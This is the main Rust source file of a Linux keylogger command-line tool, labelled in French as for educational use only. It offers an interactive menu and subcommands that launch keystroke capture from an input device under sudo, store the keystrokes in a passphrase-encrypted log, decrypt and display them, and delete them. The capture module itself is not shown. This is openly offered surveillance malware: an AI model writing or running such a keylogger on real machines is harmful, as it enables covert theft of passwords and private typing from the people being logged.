mod config;
mod modules;

use modules::key_manager::get_or_create_key;
use std::io::{self, Write};
use clap::{Parser, Subcommand};
use colored::Colorize;
use inquire::Select;
use std::process::Command;

/// 🎯 Keylogger CLI — à usage éducatif uniquement
#[derive(Parser)]
#[command(name = "Keylogger")]
#[command(about = "Capture et chiffre les frappes clavier", long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Menu interactif
    Start {
        #[arg(short, long, default_value = "/dev/input/event3")]
        device: String,
    },

    /// Lancement direct du keylogger (appelé par le menu)
    Run {
        #[arg(short, long, default_value = "/dev/input/event3")]
        device: String,
    },

    /// Lecture directe des logs (appelé par le menu)
    Read {
        #[arg(short, long, default_value = "logs.enc")]
        file: String,
    },
}

fn main() {
    // ASCII logo
    println!("{}", "  _  __          _                 ".yellow());
    println!("{}", " | |/ /___ _   _| | ___  ___ _ __  ".yellow());
    println!("{}", " | ' // _ \\ | | | |/ _ \\/ _ \\ '__| ".yellow());
    println!("{}", " | . \\  __/ |_| | |  __/  __/ |    ".yellow());
    println!("{}", " |_|\\_\\___|\\__,_|_|\\___|\\___|_|    ".yellow());
    println!();

    let cli = Cli::parse();

    match cli.command {
        Commands::Start { device } => {
            let options = vec![
                "Lancer le keylogger",
                "Lire les logs déchiffrés",
                "Supprimer les logs",
                "Quitter",
            ];

            let ans = Select::new("📋 Que veux-tu faire ?", options).prompt();

            match ans {
                Ok(choice) => match choice {
                    "Lancer le keylogger" => {
                        Command::new("xterm")
                            .arg("-e")
                            .arg(format!(
                                "bash -c 'sudo ./target/release/keylogger-rust run --device {}'",
                                device
                            ))
                            .spawn()
                            .expect("Échec de lancement du keylogger");
                    }

                    "Lire les logs déchiffrés" => {
                        Command::new("xterm")
			    .arg("-e")
			    .arg("bash -c './target/release/keylogger-rust read; echo \"Appuie sur une touche pour fermer...\"; read'")
			    .spawn()
			    .expect("Échec de lecture des logs");

                    }

                    "Supprimer les logs" => {
			    let path = dirs::data_local_dir()
				.unwrap_or_else(|| std::env::current_dir().unwrap())
				.join("logs.enc");

			    if path.exists() {
				let _ = std::fs::remove_file(&path);
				println!("{}", "🧹 Logs supprimés !".green());
			    } else {
				println!("{}", "❌ Aucun fichier de logs à supprimer.".red());
			    }
			}

                    "Quitter" => {
                        println!("{}", "🚪 Fermeture du menu.".red());
                    }

                    _ => {}
                },
                Err(_) => println!("❌ Erreur dans le menu"),
            }
        }

        Commands::Run { device } => {
            println!("{}", format!("[*] Keylogger démarré sur {}", device).green());

            print!(" Entrez votre passphrase : ");
            io::stdout().flush().unwrap();

            let mut passphrase = String::new();
            io::stdin().read_line(&mut passphrase).unwrap();
            let passphrase = passphrase.trim();

            let _key = get_or_create_key(passphrase);
            modules::logger::start_keylogger(&device, passphrase);
        }

        Commands::Read { file } => {
            println!("{}", format!("[*] Lecture du fichier {}", file).cyan());

            print!(" Entrez votre passphrase : ");
            io::stdout().flush().unwrap();

            let mut passphrase = String::new();
            io::stdin().read_line(&mut passphrase).unwrap();
            let passphrase = passphrase.trim();

            let path = dirs::data_local_dir()
		.unwrap_or_else(|| std::env::current_dir().unwrap())
		.join("logs.enc")
		.to_string_lossy()
		.to_string();

	    modules::decrypt::read_encrypted_logs(&path, passphrase);
        }
    }
}
